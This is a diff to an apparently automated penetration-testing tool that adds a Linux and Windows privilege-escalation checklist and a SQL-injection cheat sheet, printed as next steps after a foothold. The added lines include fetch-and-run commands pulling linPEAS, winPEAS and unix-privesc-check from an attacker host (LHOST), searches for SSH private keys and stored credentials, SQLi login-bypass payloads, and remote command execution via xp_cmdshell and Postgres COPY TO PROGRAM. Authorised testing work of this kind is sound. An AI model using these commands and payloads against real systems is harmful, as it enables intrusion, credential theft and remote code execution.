@@ -4004,6 +4004,68 @@ def emit_reverse_shells(vulns, args, loot):
             loot.add('recommend', f"[revshell:{name}] {payload}")
 
 
+# ── Privilege-escalation hand-off (pentestmonkey unix-privesc-check + GTFOBins) ──
+_LINUX_PRIVESC = [
+    "sudo -l                                  # sudo rights -> GTFOBins",
+    "find / -perm -4000 -type f 2>/dev/null   # SUID binaries -> GTFOBins",
+    "getcap -r / 2>/dev/null                  # file capabilities (cap_setuid)",
+    "cat /etc/crontab; ls -la /etc/cron.*     # writable/root cron jobs",
+    "grep -rl . /etc/passwd -w 2>/dev/null; ls -l /etc/passwd  # writable /etc/passwd",
+    "ls -la /home/*/.ssh /root/.ssh 2>/dev/null; find / -name id_rsa 2>/dev/null",
+    "ps aux --forest; ss -ltnp                # local services / pspy for cron",
+    "wget http://LHOST/unix-privesc-check -O upc; sh upc standard   # pentestmonkey",
+    "curl http://LHOST/linpeas.sh | sh        # linPEAS full sweep",
+    "# any SUID/sudo binary -> https://gtfobins.github.io/#<binary>",
+]
+_WINDOWS_PRIVESC = [
+    "whoami /priv                             # SeImpersonate/SeAssignPrimaryToken -> PrintSpoofer/GodPotato",
+    "whoami /groups; net user %USERNAME%",
+    "systeminfo                               # -> windows-exploit-suggester / wesng",
+    "powershell -c iex(iwr http://LHOST/winPEAS.ps1 -UseBasicParsing)",
+    "wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\\\Windows\"  # unquoted paths",
+    "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services  # weak service perms (accesschk)",
+    "cmdkey /list; dir /s *.kdbx *.config unattend.xml    # stored creds",
+]
+# SQL-injection auth-bypass / enumeration cheat sheet (pentestmonkey style)
+_SQLI_CHEATS = [
+    "auth bypass:  ' OR '1'='1'-- -   |   admin'-- -   |   ' OR 1=1#   |   \") OR (\"1\"=\"1",
+    "UNION cols:   ' ORDER BY 1-- -  (increment until error)  then  ' UNION SELECT 1,2,3-- -",
+    "MySQL enum:   ' UNION SELECT schema_name,2 FROM information_schema.schemata-- -",
+    "MySQL creds:  ' UNION SELECT user,password FROM mysql.user-- -",
+    "MSSQL RCE:    '; EXEC xp_cmdshell 'whoami'-- -   (if sysadmin + xp_cmdshell enabled)",
+    "Postgres RCE: '; COPY (SELECT '') TO PROGRAM 'id'-- -",
+    "time-blind:   ' OR SLEEP(5)-- -  (MySQL) | ' WAITFOR DELAY '0:0:5'-- - (MSSQL)",
+    "automate:     sqlmap -u '<url>' --batch --dbs  (then --dump / --os-shell)",
+]
+
+
+def emit_privesc_checklist(os_info, services, loot):
+    """P2 hand-off: OS-keyed privesc checklist (the tool has no shell, so it hands
+    the operator the exact next steps once a foothold is obtained)."""
+    if not loot:
+        return
+    name = ' '.join(str(o.get('name', '')) for o in (os_info or [])).lower()
+    svc = ' '.join(s.get('service', '').lower() for s in services.values())
+    is_win = 'windows' in name or any(p in services for p in (3389, 445, 5985)) or 'microsoft-ds' in svc
+    steps = _WINDOWS_PRIVESC if is_win else _LINUX_PRIVESC
+    loot.add('recommend', f"# --- Privilege escalation checklist ({'Windows' if is_win else 'Linux'}) ---")
+    for s in steps:
+        loot.add('recommend', f"[privesc] {s}")
+
+
+def emit_sqli_cheatsheet(vulns, corpus_params, loot):
+    """Drop a SQLi auth-bypass/enum cheat sheet when SQLi is found or a param/login
+    surface exists that warrants manual testing."""
+    if not loot:
+        return
+    relevant = any('sql' in v.get('desc', '').lower() for v in vulns) or bool(corpus_params)
+    if not relevant:
+        return
+    loot.add('recommend', "# --- SQL injection cheat sheet (pentestmonkey) ---")
+    for c in _SQLI_CHEATS:
+        loot.add('recommend', f"[sqli] {c}")
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -4905,6 +4967,9 @@ def phase6_analysis(target, services, vulns, outdir, args, api_key=None, loot=No
 
     # Reverse-shell cheat sheet (pentestmonkey) when a foothold/RCE finding exists
     emit_reverse_shells(vulns_sorted, args, loot)
+    # SQLi cheat sheet + OS-keyed privesc hand-off (pentestmonkey unix-privesc-check/GTFOBins)
+    emit_sqli_cheatsheet(vulns_sorted, [u for u in getattr(loot, 'urls', []) if '[param]' in u], loot)
+    emit_privesc_checklist(os_info, services, loot)
 
     # AI Deep Analysis
     ai_response = None
